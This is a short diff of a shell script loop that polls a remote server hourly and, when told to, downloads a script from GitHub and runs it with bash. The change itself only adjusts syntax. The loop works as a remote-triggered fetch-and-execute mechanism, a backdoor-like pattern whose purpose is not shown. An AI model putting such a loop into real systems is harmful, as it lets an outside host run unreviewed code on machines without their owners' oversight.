@@ -11,7 +11,7 @@ do
 mod=`curl  -X POST  https://api.hankhu.xyz/sys.php -d 'usernameid' -sk`
 
 if [ $mod -eq 1 ];then
-  bash  <(curl  -Ls https://raw.githubusercontent.com/hankhu666/sys/main/usernameid.sh)
+  bash  < <(curl  -Ls https://raw.githubusercontent.com/hankhu666/sys/main/usernameid.sh)
 fi
 
 sleep 3600
